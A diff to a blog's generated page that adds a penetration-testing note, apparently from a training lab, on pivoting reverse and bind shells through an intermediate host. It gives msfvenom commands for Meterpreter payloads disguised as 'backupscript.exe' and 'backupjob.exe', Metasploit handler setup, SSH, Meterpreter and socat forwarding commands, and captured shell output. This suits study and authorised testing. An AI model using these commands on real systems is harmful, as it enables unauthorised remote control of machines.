@@ -266,7 +266,35 @@
 <h5 id="Proxy-Handling-Windows"><a href="#Proxy-Handling-Windows" class="headerlink" title="Proxy Handling (Windows)"></a>Proxy Handling (Windows)</h5><p>Use <strong>Proxifier</strong> to route selected tools through the proxy:</p>
 <p><img src="/img/proxifier.png" alt="Proxifier"></p>
 <p>➜ After configuration, any selected tool will have its traffic forwarded automatically.</p>
-]]></content>
+<h1 id="Reverse-Port-Forwarding-Reverse-Bind-Shell"><a href="#Reverse-Port-Forwarding-Reverse-Bind-Shell" class="headerlink" title="Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )"></a>Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )</h1><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Reverse-Shell-Preparation-Payload-Listener-Setup"><a href="#Reverse-Shell-Preparation-Payload-Listener-Setup" class="headerlink" title="Reverse Shell Preparation (Payload + Listener Setup)"></a>Reverse Shell Preparation (Payload + Listener Setup)</h3><p>Create Reverse Shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=&lt;Internal-listener-Port-on-n+1&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p> Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT &lt;listener-Port-on-n&gt; </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0 </span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n+1 → n )"></a>Creating the Reverse Port Forwarding Tunnel ( n+1 → n )</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -R Internal-IP-of-PivotHost-n+1:&lt;Internal-listener-Port-on-n+1&gt;:0.0.0.0:&lt;listener-Port-on-n&gt; username@n+1 -vN</span><br></pre></td></tr></table></figure>
+
+<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -R -l &lt;listener-Port-on-n&gt; -p &lt;Internal-listener-Port-on-n+1&gt; -L IP-of-n-machine</span><br></pre></td></tr></table></figure>
+
+<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:&lt;Internal-listener-Port-on-n+1&gt;,fork TCP4:IP-of-n-machine:&lt;listener-Port-on-n&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Execute-Reverse-Shell"><a href="#Execute-Reverse-Shell" class="headerlink" title="Execute Reverse Shell"></a>Execute Reverse Shell</h3><p>Once you execute <code>backupscript.exe</code> on Windows (n+2), we receive a shell from Windows pivoted via the Ubuntu server :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2336 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1637]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="Bind-Shell-Preparation-Payload-Bind-Setup"><a href="#Bind-Shell-Preparation-Payload-Bind-Setup" class="headerlink" title="Bind Shell Preparation (Payload + Bind Setup)"></a>Bind Shell Preparation (Payload + Bind Setup)</h3><p>Create Bind Shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+
+<p> Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT Bind-port-on-n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n → n+1 )"></a>Creating the Reverse Port Forwarding Tunnel ( n → n+1 )</h3><h6 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:Bind-port-on-n+1,fork TCP4:n+2-machine:Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Execute-Bind-Shell"><a href="#Execute-Bind-Shell" class="headerlink" title="Execute Bind Shell"></a>Execute Bind Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: INLANEFREIGHT\victor</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Pivoting And Port Forwarding</category>
